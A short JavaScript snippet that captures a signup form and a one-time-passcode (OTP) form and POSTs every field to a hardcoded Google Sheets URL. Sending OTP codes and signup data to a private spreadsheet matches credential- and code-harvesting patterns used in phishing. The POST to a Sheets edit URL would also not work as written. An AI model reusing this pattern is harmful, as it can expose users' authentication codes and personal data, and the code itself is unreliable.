// Replace 'SPREADSHEET_URL' with the URL of your Google Sheets document
const spreadsheetUrl = 'https://docs.google.com/spreadsheets/d/1gdUGCj2GuUEJiWMrAqRgtvtDhldl2G_du3tLl11uJRU/edit#gid=0';

// Function to send form data to Google Sheets
function sendDataToGoogleSheets(data) {
  const formData = new FormData();
  for (const field in data) {
    formData.append(field, data[field]);
  }
  
  fetch(spreadsheetUrl, { method: 'POST', body: formData })
    .then(response => {
      if (response.ok) {
        console.log('Data sent to Google Sheets successfully!');
      } else {
        console.error('Error sending data to Google Sheets:', response.status);
      }
    })
    .catch(error => {
      console.error('Error sending data to Google Sheets:', error);
    });
}

// Signup form submission
const signupForm = document.getElementById('signupForm');
signupForm.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const formData = new FormData(signupForm);
  const data = Object.fromEntries(formData.entries());
  
  sendDataToGoogleSheets(data);
  signupForm.reset();
});

// OTP form submission
const otpForm = document.getElementById('otpForm');
otpForm.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const formData = new FormData(otpForm);
  const data = Object.fromEntries(formData.entries());
  
  sendDataToGoogleSheets(data);
  otpForm.reset();
});
